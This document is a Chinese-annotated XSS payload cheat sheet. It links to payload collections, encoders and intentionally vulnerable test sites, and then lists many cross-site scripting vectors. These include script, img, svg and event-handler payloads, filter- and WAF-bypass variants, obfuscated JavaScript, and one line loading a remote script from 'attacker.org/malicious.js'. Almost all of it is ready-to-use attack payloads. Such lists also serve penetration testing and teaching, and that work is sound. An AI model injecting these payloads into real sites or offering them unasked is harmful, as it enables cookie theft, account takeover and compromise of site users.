**payload**
- [ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
- [masatokinugawa/filterbypass](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet)
- [bugbounty-cheatsheet/cheatsheets/xss.md](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md)
- [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

**在线HTML编码**
- https://www.qqxiuzi.cn/bianma/zifushiti.php
- http://www.convertstring.com/zh_CN/EncodeDecode/HtmlEncode
- https://tool.oschina.net/encode

**url编码**
- http://web.chacuo.net/charseturlencode
- https://meyerweb.com/eric/tools/dencoder/
- http://tool.oschina.net/encode?type=4
- http://www.mxcz.net/tools/Url.aspx

**在线测试**
- http://demo.testfire.net/
- https://juice-shop.herokuapp.com/#/search
- https://xsschop.chaitin.cn/demo/

---

```h
<script>
<script>alert(123)</script>
<script>prompt(1);</script>
<script>confirm(1);</script>
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
<script>+alert(1)</script>
<script>setTimeout(alert(1),0)</script>
<script src=data:text/javascript,alert(1)></script>
<script>alert(String.fromCharCode(49,49))</script>
<<SCRIPT>alert("XSS");
//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<script///////////////////////////////////////////////>alert(123)</script>
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
"><script>alert(123)</script>
'><script>alert(123)</script>
><script>alert(123)</script>
</script><script>alert(123)</script>
--><script>alert(123)</script>
><script>alert(123);</script x=
<script>alert/(a/)</script>
<script NAUGHTY_HACKER>alert(1)</script NAUGHTY_HACKER>
%3cscript%3ealert("XSS");%3c/script%3e
&ltscript&gtalert(document.cookie);</script>

//绕过进行一次移除操作：
<scr<script>ipt>alert("XSS")</scr<script>ipt>

//Script 标签可以用于定义一个行内的脚本或者从其他地方加载脚本：
<script>alert("XSS")</script>
<script src="http://attacker.org/malicious.js"></script>
```
```h
<img>
<img src=1 onerror=alert(1)>
<img src=x onerror=alert(123) />

<input>
<input onfocus="alert('xss');">
<input onblur=alert("xss") autofocus><input autofocus> //竞争焦点,从而触发onblur事件
<input onfocus="alert('xss');" autofocus>  //通过autofocus属性执行本身的focus事件,这个向量是使焦点自动跳到输入元素上,触发焦点事件,无需用户去触发
<input type="image" formaction=JaVaScript:alert(0)>

<details>
<details open OntogGle="alert(1)">  //使用open属性触发ontoggle事件,无需用户去触发

<svg>
<svg onload=alert("xss");>
<svg><script>alert(123)</script>
<svg/onload=prompt(1);>
<svg><script>alert&#114;&1#29;</script>
<svg><script>123<1>alert(123)</script>

<select>
<select onfocus=alert(1)></select>
<select onfocus=alert(1) autofocus> //通过autofocus属性执行本身的focus事件

<iframe>
<iframe onload=alert("xss");></iframe>
<IFRAME SRC="javascript:alert(29);"></IFRAME>

<video>
<video><source onerror="alert(1)">
<video poster=javascript:alert(1)//></video> // Works Upto Opera 10.5
<video onkeyup=setTimeout`al\x65rt\x28/1/\x29```>
<video onkeydown=setTimeout`al\x65rt\x28/1/\x29```>

<audio>
<audio src=x onerror=alert("xss");>

<body>

<body
onscroll=alert("xss");><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>    //利用换行符以及autofocus,自动去触发onscroll事件,无需用户去触发
<body onload=prompt(1);>

<textarea>
<textarea onfocus=alert("xss"); autofocus>

<keygen>
<keygen autofocus onfocus=alert(1)> //仅限火狐

<marquee>
<marquee onstart=alert(1)>hack the planet</marquee>  //Chrome不行,火狐和IE都可以
<marquee behavior="alternate" onstart=alert(1)>hack the planet</marquee>
<marquee loop="1" onfinish=alert(1)>hack the planet</marquee>
<marquee/onstart=confirm(2)>/

<isindex>
<isindex type=image src=1 onerror=alert("xss")>   //仅限于IE

<anytag>
<anytag onmouseover=alert(1)>M
<anytag onclick=alert(1)>M

<a>
<a onmouseover=alert(1)>M
<a onclick=alert(1)>M
<a href=javascript:alert(1)>M
<a href=javasc&#114;ipt:%61%6c%65%72%74%28%31%29>M
<a href="javascript:alert('test')">link</a>

<div>
<div onclick="alert('xss')">
<div onmouseenter="alert('xss')">   //当用户鼠标移动到 div 上时就会触发我们的代码。
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">

<style>
<style onload=alert(1) />

<form>
<form/action=javascript:alert(22)><input/type=submit>
<form onsubmit=alert(23)><button>M

<object>
<object data="javascript:alert(document.domain)">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">

<embed>
<embed/src=javascript:alert(29);>
```
```h
利用link远程包含js文件
PS：在无CSP的情况下才可以
<link rel=import href="http://127.0.0.1/1.js">


javascript伪协议
<a>标签
<a href="javascript:alert(`xss`);">xss</a>

<iframe>标签
<iframe src=javascript:alert('xss');></iframe>

<img>标签
<img src=javascript:alert('xss')>//IE7以下

<form>标签
<form action="Javascript:alert(1)"><input type=submit>


其它
expression属性
<img style="xss:expression(alert('xss''))"> // IE7以下
<div style="color:rgb(''�x:expression(alert(1))"></div> //IE7以下
<style>#test{x:expression(alert(/XSS/))}</style> // IE7以下

background属性
<table background=javascript:alert(1)></table> //在Opera 10.5和IE6上有效

杂项
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode<script>alert('xss')</script>
<math><a xlink:href="//baidu.com">click

<script>([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()</script>

<script>ꆇ='',ꉄ=!ꆇ+ꆇ,ꉦ=!ꉄ+ꆇ,ꊗ=ꆇ+{},ꀻ=ꉄ[ꆇ++],ꃋ=ꉄ[ꆚ=ꆇ],ꋕ=++ꆚ+ꆇ,ꐍ=ꊗ[ꆚ+ꋕ],ꉄ[ꐍ+=ꊗ[ꆇ]+(ꉄ.ꉦ+ꊗ)[ꆇ]+ꉦ[ꋕ]+ꀻ+ꃋ+ꉄ[ꆚ]+ꐍ+ꀻ+ꊗ[ꆇ]+ꃋ][ꐍ](ꉦ[ꆇ]+ꉦ[ꆚ]+ꉄ[ꋕ]+ꃋ+ꀻ+"(ꆇ)")()</script>

<script>ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+"(ᨆ)")()</script>

¼script¾alert(¢XSS¢)¼/script¾

<portal id="q" src="bing.com" onload="print(q.activate())"></portal>
```
```h
Classical #XSS WAF Bypass
Inline HTMLi + #PHP Strip Tags

Code:
<a href="<?=strip_tags($_GET['url']);?>">

PoC:
?url="onm<>ouseover="ale<>rt(1)
```
```h
无害,仅测试
1<b>1
<table style="left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;"><tbody><tr><td style="color:#FFFFFF;z-index: 6000;vertical-align:top;"><h1>test</h1></td></tr></tbody></table>
```